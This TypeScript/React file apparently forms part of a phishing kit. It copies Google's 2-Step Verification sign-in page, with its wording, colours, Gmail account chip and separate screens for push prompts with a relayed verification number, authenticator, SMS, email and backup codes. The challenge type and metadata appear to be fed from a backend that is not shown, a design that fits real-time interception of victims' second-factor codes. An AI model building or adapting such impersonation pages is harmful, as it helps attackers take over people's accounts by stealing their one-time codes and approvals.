/**
 * Google Sign-in UI Components
 * Shared components and 2FA step
 */
'use client';

import React from 'react';

// 2FA Step Component
interface TwoFactorStepProps {
  email: string;
  challengeType: string | null;
  challengeMetadata: any;
  twoFactorCode: string;
  setTwoFactorCode: (value: string) => void;
  dontAskAgain: boolean;
  setDontAskAgain: (value: boolean) => void;
  error: string | null;
  isLoading: boolean;
  onNext: () => void;
  onKeyPress: (e: React.KeyboardEvent) => void;
}

export function TwoFactorStep({
  email,
  challengeType,
  challengeMetadata,
  twoFactorCode,
  setTwoFactorCode,
  dontAskAgain,
  setDontAskAgain,
  error,
  isLoading,
  onNext,
  onKeyPress,
}: TwoFactorStepProps) {
  const renderChallengeUI = () => {
    // Push notification (phone prompt)
    if (challengeType === 'PUSH' || challengeType === 'APP') {
      return (
        <PushChallengeUI
          challengeMetadata={challengeMetadata}
          dontAskAgain={dontAskAgain}
          setDontAskAgain={setDontAskAgain}
        />
      );
    }

    // TOTP / SMS / Email code input
    if (challengeType === 'TOTP' || challengeType === 'SMS' || challengeType === 'EMAIL' || challengeType === 'VOICE' || challengeType === 'BACKUP') {
      const maxLength = challengeType === 'BACKUP' ? 8 : 6;
      const label = challengeType === 'BACKUP' ? 'Enter backup code' : 'Enter code';
      
      return (
        <CodeInputUI
          code={twoFactorCode}
          setCode={setTwoFactorCode}
          challengeType={challengeType}
          challengeMetadata={challengeMetadata}
          error={error}
          maxLength={maxLength}
          label={label}
          onKeyPress={onKeyPress}
        />
      );
    }

    // Security key
    if (challengeType === 'SECURITY_KEY') {
      return <SecurityKeyUI challengeMetadata={challengeMetadata} />;
    }

    return null;
  };

  return (
    <div className="w-1/3 flex flex-col md:flex-row px-6 md:p-[48px] items-stretch min-h-full">
      <div className="flex flex-col items-start md:w-[45%] md:pr-[48px] md:mt-[72px]">
        <h1 className="text-[28px] leading-[36px] font-normal text-[#202124] mb-4">
          2-Step Verification
        </h1>
        <p className="text-[16px] text-[#202124] font-normal mb-8 leading-[24px]">
          To help keep your account safe, Google wants to make sure it's really you trying to sign in
        </p>

        <div className="flex items-center gap-2 border border-[#dadce0] rounded-full px-1 py-0.5 pr-3 w-fit cursor-pointer hover:bg-[#f1f3f4] transition-colors group">
          <div className="w-6 h-6 rounded-full bg-[#5f6368] flex items-center justify-center overflow-hidden shrink-0">
            <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 24 24">
              <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
            </svg>
          </div>
          <span className="text-[14px] font-normal text-[#202124] truncate max-w-[200px]">
            {email.endsWith('@gmail.com') ? email : `${email}@gmail.com`}
          </span>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-4 h-4 text-[#5f6368]">
            <path d="m6 9 6 6 6-6" />
          </svg>
        </div>
      </div>

      <div className="flex flex-col md:w-[55%] mt-8 md:mt-0">
        <div className="flex flex-col h-full">
          <div className="flex-1">
            {renderChallengeUI()}
          </div>
        </div>
      </div>

      {/* Footer buttons */}
      <div className="mt-8 md:mt-0 md:absolute md:bottom-[48px] md:left-[48px] md:right-[48px] flex justify-end items-center">
        <div className="flex items-center gap-4">
          <div className="text-[#1a73e8] text-[14px] font-medium cursor-pointer hover:underline">
            Try another way
          </div>
          
          {(challengeType === 'TOTP' || challengeType === 'SMS' || challengeType === 'EMAIL' || challengeType === 'BACKUP') && (
            <button
              onClick={onNext}
              disabled={isLoading || !twoFactorCode}
              className="bg-[#1a73e8] text-white px-6 py-2 rounded-full font-medium hover:shadow-md hover:bg-[#1557b0] transition-shadow text-sm disabled:opacity-50 disabled:cursor-not-allowed h-9"
            >
              {isLoading ? '...' : 'Next'}
            </button>
          )}
        </div>
      </div>
    </div>
  );
}

// Push Challenge UI (with verification number)
function PushChallengeUI({ challengeMetadata, dontAskAgain, setDontAskAgain }: any) {
  return (
    <div className="flex flex-col w-full">
      {challengeMetadata?.verificationNumber && (
        <div className="mb-6">
          <span className="text-[72px] leading-none font-normal text-[#202124] tracking-tight">
            {challengeMetadata.verificationNumber}
          </span>
        </div>
      )}

      <h2 className="text-[16px] font-medium text-[#202124] mb-3 leading-[24px]">
        {challengeMetadata?.title || 'Check your phone'}
      </h2>

      <p className="text-[14px] text-[#5f6368] leading-[20px] mb-6 font-normal">
        {challengeMetadata?.instruction || (
          <>
            Google sent a notification to your phone. Open the Gmail app, tap{' '}
            <strong className="text-[#202124]">Yes</strong> on the prompt
            {challengeMetadata?.verificationNumber && (
              <>, then tap <strong className="text-[#202124]">{challengeMetadata.verificationNumber}</strong></>
            )} on your phone to verify it's you.
          </>
        )}
      </p>

      <div className="flex items-center gap-3">
        <div className="relative flex items-center">
          <input
            type="checkbox"
            id="push-dont-ask-again"
            checked={dontAskAgain}
            onChange={(e) => setDontAskAgain(e.target.checked)}
            className="peer appearance-none w-[18px] h-[18px] border-2 border-[#5f6368] rounded-sm cursor-pointer checked:bg-[#1a73e8] checked:border-[#1a73e8] transition-all duration-200"
          />
          <svg className="absolute w-3 h-3 text-white pointer-events-none hidden peer-checked:block left-[3px] top-[3px]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="4">
            <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
          </svg>
        </div>
        <label htmlFor="push-dont-ask-again" className="text-[14px] text-[#202124] cursor-pointer select-none font-normal">
          Don't ask again on this device
        </label>
      </div>
    </div>
  );
}

// Code Input UI (TOTP, SMS, Email)
function CodeInputUI({ code, setCode, challengeType, challengeMetadata, error, maxLength, label, onKeyPress }: any) {
  const getTitle = () => {
    if (challengeType === 'SMS') return challengeMetadata?.title || '2-Step Verification';
    if (challengeType === 'EMAIL') return challengeMetadata?.title || '2-Step Verification';
    if (challengeType === 'BACKUP') return challengeMetadata?.title || 'Enter backup code';
    return '2-Step Verification';
  };

  const getDescription = () => {
    if (challengeType === 'SMS') return challengeMetadata?.description || 'A text message with a verification code was sent to your phone';
    if (challengeType === 'EMAIL') return challengeMetadata?.description || 'An email with a verification code was sent to your recovery email';
    if (challengeType === 'BACKUP') return challengeMetadata?.description || 'Enter one of your 8-digit backup codes';
    return 'Get a verification code from the Google Authenticator app';
  };

  return (
    <div className="w-full">
      <h2 className="text-[16px] font-normal text-[#202124] mb-2">{getTitle()}</h2>
      <p className="text-[14px] text-[#5f6368] mb-6 leading-[20px]">{getDescription()}</p>

      <div className="mb-4">
        <FloatingLabelInput
          id="2fa-code"
          type="text"
          label={label}
          value={code}
          onChange={(e) => {
            const value = e.target.value.replace(/\D/g, '').slice(0, maxLength);
            setCode(value);
          }}
          onKeyDown={onKeyPress}
          error={!!error}
          autoComplete="one-time-code"
          inputMode="numeric"
          pattern="[0-9]*"
        />
        {error && <ErrorMessage message={error} />}
      </div>

      <div className="flex items-center gap-3">
        <div className="relative flex items-center">
          <input
            type="checkbox"
            id="totp-dont-ask-again"
            defaultChecked={true}
            className="peer appearance-none w-[18px] h-[18px] border-2 border-[#5f6368] rounded-[2px] cursor-pointer checked:bg-[#1a73e8] checked:border-[#1a73e8] transition-all duration-200"
          />
          <svg className="absolute w-3.5 h-3.5 text-white pointer-events-none hidden peer-checked:block left-[2px] top-[2px]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="4">
            <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
          </svg>
        </div>
        <label htmlFor="totp-dont-ask-again" className="text-[14px] text-[#202124] cursor-pointer select-none font-normal">
          Don't ask again on this device
        </label>
      </div>
    </div>
  );
}

// Security Key UI
function SecurityKeyUI({ challengeMetadata }: any) {
  return (
    <div className="flex flex-col items-start w-full">
      <h2 className="text-[16px] leading-[24px] font-medium text-[#202124] mb-3">
        {challengeMetadata?.title || 'Use your security key'}
      </h2>
      <p className="text-[14px] text-[#5f6368] leading-[20px] font-normal mb-6">
        {challengeMetadata?.instruction || "Insert your security key into your computer's USB port and tap it when prompted."}
      </p>
      <div className="bg-[#f8f9fa] border border-[#dadce0] rounded-lg p-4 w-full">
        <p className="text-[13px] text-[#5f6368] leading-[18px]">
          Make sure to use a security key that's registered with your Google Account.
        </p>
      </div>
    </div>
  );
}

// Floating Label Input Component
interface FloatingLabelInputProps {
  id: string;
  type: string;
  label: string;
  value: string;
  onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  onKeyDown?: (e: React.KeyboardEvent<HTMLInputElement>) => void;
  error?: boolean;
  autoComplete?: string;
  autoFocus?: boolean;
  inputMode?: 'text' | 'numeric' | 'tel';
  pattern?: string;
}

export function FloatingLabelInput({
  id,
  type,
  label,
  value,
  onChange,
  onKeyDown,
  error,
  autoComplete,
  autoFocus,
  inputMode,
  pattern,
}: FloatingLabelInputProps) {
  return (
    <div className="relative group">
      <input
        id={id}
        type={type}
        value={value}
        onChange={onChange}
        onKeyDown={onKeyDown}
        placeholder=" "
        autoComplete={autoComplete}
        autoFocus={autoFocus}
        inputMode={inputMode}
        pattern={pattern}
        className={`peer w-full px-4 py-4 text-base bg-transparent border rounded-lg outline-none transition-all duration-200 focus:border-2 focus:px-[15px] focus:py-[15px] ${
          error
            ? 'border-[#d93025] focus:border-[#d93025]'
            : 'border-[#dadce0] focus:border-[#1a73e8] hover:border-[#202124]'
        }`}
      />
      <label
        htmlFor={id}
        className={`absolute left-4 top-1/2 -translate-y-1/2 text-base transition-all duration-200 pointer-events-none bg-white px-1 peer-focus:top-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-0 peer-[:not(:placeholder-shown)]:text-xs ${
          error ? 'text-[#d93025] peer-focus:text-[#d93025]' : 'text-[#5f6368] peer-focus:text-[#1a73e8]'
        }`}
      >
        {label}
      </label>
    </div>
  );
}

// Error Message Component
export function ErrorMessage({ message }: { message: string }) {
  return (
    <div className="text-[#d93025] text-xs mt-1 ml-1 flex items-center gap-1">
      <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
        <path
          fillRule="evenodd"
          d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z"
          clipRule="evenodd"
        />
      </svg>
      {message}
    </div>
  );
}

// Footer Component
export function Footer() {
  return (
    <div className="w-full md:max-w-[1136px] mt-auto md:mt-6 px-6 md:px-0 py-4 flex flex-col md:flex-row justify-between items-center text-[12px] text-[#5f6368] gap-4">
      <div className="flex items-center gap-1 cursor-pointer hover:bg-[#f1f3f4] p-2 -ml-2 rounded transition-colors w-fit group">
        <span>English (United States)</span>
        <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor" className="mt-0.5">
          <path d="M7 10l5 5 5-5z" />
        </svg>
      </div>
      <div className="flex items-center gap-6">
        <span className="cursor-pointer hover:text-[#202124] transition-colors">Help</span>
        <span className="cursor-pointer hover:text-[#202124] transition-colors">Privacy</span>
        <span className="cursor-pointer hover:text-[#202124] transition-colors">Terms</span>
      </div>
    </div>
  );
}
